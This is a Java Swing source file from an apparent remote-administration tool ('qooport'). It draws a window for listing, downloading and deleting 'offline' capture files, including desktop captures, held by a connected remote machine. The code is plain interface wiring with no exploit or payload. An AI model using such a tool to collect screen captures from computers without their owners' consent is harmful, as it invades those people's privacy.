package qooport.modulos;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JToolBar;
import qooport.asociado.Asociado;
import qooport.utilidades.Util;

public class ArchivosOffline extends JFrame {

    private Asociado servidor;

    public JTextArea txtListaOffline;

    public ArchivosOffline(Asociado servidor) {
        initComponents();
        this.servidor = servidor;

    }

    private void initComponents() {

        /////////////////////////////////////////////
//                TAB DE LISTA DE ARCHIVOS Y SUS TAMANIOS
        /////////////////////////////////////////////
        JPanel panelLista = new JPanel();
        JToolBar b1 = new JToolBar();
        b1.setFloatable(false);
        JScrollPane jScrollPane1;
        jScrollPane1 = new JScrollPane();
        JButton btnInfo = new JButton();
        btnInfo.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        btnInfo.setVisible(true);
        btnInfo.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                ArchivosOffline.this.btnPedirInfo(evt);
            }
        });
        b1.add(btnInfo);
        JButton btnDescargar = new JButton();
        btnDescargar.setToolTipText("Descargar el ultimo archivo generado");
        btnDescargar.setIcon(Util.cargarIcono16("/resources/download.png"));
        btnDescargar.setVisible(true);
        btnDescargar.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                txtListaOffline.setText("Solicitando ultimo archivo...");
                ArchivosOffline.this.btnDesargar(evt);
            }
        });
        b1.add(btnDescargar);

        JButton btnDescargarTodos = new JButton();
        btnDescargarTodos.setToolTipText("Decarga todos los archivos listados");
        btnDescargarTodos.setIcon(Util.cargarIcono16("/resources/download_folder.png"));
        btnDescargarTodos.setVisible(true);
        btnDescargarTodos.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                txtListaOffline.setText("Solicitando todos los archivos...");
                ArchivosOffline.this.btnDesargarTodos(evt);
            }
        });
        b1.add(btnDescargarTodos);
        JButton btnEliminar = new JButton();
        btnEliminar.setIcon(Util.cargarIcono16("/resources/delete.png"));
        btnEliminar.setVisible(true);
        btnEliminar.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                ArchivosOffline.this.btnEliminar(evt);
            }
        });
        b1.add(btnEliminar);
        txtListaOffline = new JTextArea();
        jScrollPane1.setViewportView(this.txtListaOffline);
        panelLista.setLayout(new BorderLayout());
        panelLista.add(jScrollPane1, BorderLayout.CENTER);
        panelLista.add(b1, BorderLayout.SOUTH);
//        this.tabs.addTab("Archivos", Util.cargarIcono16("/resources/disconnect.png"), panelLista);

        this.setIconImage(Util.cargarIcono16("/resources/offline.png").getImage());

        /////////////////////////////////////////////
//                TAB PARA VISUALIZAR EL ARCHIVO DE CAPTURAS DE ESCRITORIO
        /////////////////////////////////////////////
        this.setLayout(new BorderLayout());
//        this.add(barra, BorderLayout.NORTH);
//        this.add(tabs, BorderLayout.CENTER);
        this.add(panelLista, BorderLayout.CENTER);
        this.setSize(600, 450);
        this.setResizable(true);
        this.setVisible(true);
        this.setTitle("Archivos de captura ");
        pack();
    }

    private void btnPedirInfo(ActionEvent evt) {
        txtListaOffline.setText("Solicitando información...");
        servidor.pedirListaOffline();
    }

    private void btnDesargar(ActionEvent evt) {
        txtListaOffline.setText(txtListaOffline.getText() + "\n" + "Descargando último archivo...");
        servidor.descargarArchivoOffline();
    }

    private void btnDesargarTodos(ActionEvent evt) {
        txtListaOffline.setText(txtListaOffline.getText() + "\n" + "Descargando todos los archivos...");
        servidor.descargarListaOffline();
    }

    private void btnEliminar(ActionEvent evt) {
        servidor.eliminarListaOffline();
    }

}
